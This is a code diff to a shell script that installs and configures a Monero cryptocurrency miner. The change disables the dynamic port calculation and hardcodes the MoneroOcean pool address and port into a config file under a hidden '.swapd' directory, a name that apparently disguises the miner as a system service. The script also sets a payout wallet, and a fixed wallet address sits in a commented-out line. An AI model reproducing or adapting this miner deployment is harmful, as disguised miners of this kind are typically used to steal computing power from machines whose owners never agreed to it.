@@ -175,19 +175,19 @@ power2() {
   fi
 }
 
-PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
-PORT=$(( $PORT == 0 ? 1 : $PORT ))
-PORT=`power2 $PORT`
-PORT=$(( 10000 + $PORT ))
-if [ -z $PORT ]; then
-  echo "ERROR: Can't compute port"
-  exit 1
-fi
+#PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
+#PORT=$(( $PORT == 0 ? 1 : $PORT ))
+#PORT=`power2 $PORT`
+#PORT=$(( 10000 + $PORT ))
+#if [ -z $PORT ]; then
+#  echo "ERROR: Can't compute port"
+#  exit 1
+#fi
 
-if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
-  echo "ERROR: Wrong computed port value: $PORT"
-  exit 1
-fi
+#if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
+#  echo "ERROR: Wrong computed port value: $PORT"
+#  exit 1
+#fi
 
 
 echo "[*] #printing intentions..."
@@ -309,7 +309,7 @@ fi
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 
 echo "sed"
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.swapd/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
 #sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' $HOME/.swapd/config.json
 #sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
